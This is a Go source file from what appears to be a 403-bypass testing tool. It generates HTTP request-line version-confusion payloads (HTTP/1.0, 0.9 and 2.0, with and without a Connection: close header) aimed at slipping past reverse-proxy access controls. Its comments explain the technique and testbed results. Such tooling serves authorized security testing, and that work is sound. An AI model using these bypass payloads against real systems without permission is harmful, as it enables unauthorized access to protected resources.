package payload

import (
	"github.com/slicingmelon/go-rawurlparser"
	GB403Logger "github.com/herraristotle/gobypass403/core/utils/logger"
)

// http10Versions is the text request-line version set the module probes.
var http10Versions = []string{"HTTP/1.0", "HTTP/0.9", "HTTP/2.0"}

// GenerateHTTP10Payloads generates the request-line version-confusion
// payloads (unKover test_http10 parity + addendum 3 Phase D item 9).
// Reverse proxies sometimes apply ACLs only to HTTP/1.1 request parsing
// (or reject/parse other versions differently in the chain), so the same
// request-target sent with a non-default version token can slip past.
// Three text versions ship (HackTricks protocol-version diff, constrained
// to text variants — the client is HTTP/1.x only, no real h2/h2c
// transport): HTTP/1.0 (unKover's exact `curl --http1.0` shape, verified
// against the testbed's :8081/access/rproxy/protocol10), HTTP/0.9 (yields
// a version-parsing differential — 400 vs 403 on the testbed's nginx) and
// HTTP/2.0 (accepted by nginx where 1.1 is accepted). Each version ships
// plain plus a Connection: close companion. The module keeps its historical
// `http10` name: registry order is baked into debug-token bytes and CLI
// `-m http10` is user-facing, so a rename would break both.
func (pg *PayloadGenerator) GenerateHTTP10Payloads(targetURL string, bypassModule string) []BypassPayload {
	var jobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL: %s", targetURL)
		return jobs
	}

	rawURI := parsedURL.Path
	if parsedURL.Query != "" {
		rawURI += "?" + parsedURL.Query
	}

	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       pg.method,
		Body:         pg.body,
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		RawURI:       rawURI,
		BypassModule: bypassModule,
	}

	for _, version := range http10Versions {
		// Plain variant (HTTP/1.0 = unKover parity)
		job := baseJob
		job.HTTPVersion = version
		job.PayloadToken = GeneratePayloadToken(job)
		jobs = append(jobs, job)

		// Connection: close companion
		job = baseJob
		job.HTTPVersion = version
		job.Headers = []Headers{{Header: "Connection", Value: "close"}}
		job.PayloadToken = GeneratePayloadToken(job)
		jobs = append(jobs, job)
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s", len(jobs), targetURL)
	return jobs
}
